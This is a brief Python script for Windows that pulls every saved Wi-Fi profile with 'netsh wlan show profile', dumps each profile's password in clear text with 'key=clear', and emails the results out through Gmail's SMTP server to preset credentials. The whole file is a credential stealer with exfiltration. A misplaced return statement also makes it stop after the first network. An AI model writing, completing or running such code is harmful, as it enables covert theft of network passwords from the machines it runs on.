#!/usr/bin/env python

import subprocess
import smtplib
import re

email = ""
password = ""

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

def get_info():
	command = "netsh wlan show profile"
	networks = subprocess.check_output(command, shell=True)
	networks_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

	result = ""
	for network_name in networks_list:
		command = 'netsh wlan show profile "%s" key=clear' % network_name
		current_result = subprocess.check_output(command, shell=True)
		result = result + current_result + "\n\n\n\n\n\n\n###################### COMPLETED ######################\n\n\n\n\n\n\n"
		return result

result = get_info()
send_mail(email, password, result)
